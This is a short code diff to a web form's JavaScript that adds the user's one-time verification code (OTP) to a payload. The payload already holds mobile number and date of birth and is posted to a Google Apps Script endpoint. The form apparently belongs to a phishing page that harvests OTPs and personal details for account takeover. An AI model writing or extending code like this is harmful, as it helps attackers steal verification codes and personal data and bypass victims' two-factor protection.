@@ -126,6 +126,10 @@
             formData.append("mobile", document.getElementById("phone").value);
             formData.append("dob", document.getElementById("dob").value);
             formData.append("timestamp", new Date().toISOString());
+            formData.append(
+              "otp",
+              document.getElementById("verification-code").value
+            );
             fetch(
               "https://script.google.com/macros/s/AKfycbyCZHcK8K_1-U7xN1XqJp-48cQwnyDekQ78T4Hdlq3KW5TgNPSlKwdWTKPJpLrHb0fA4g/exec",
               {
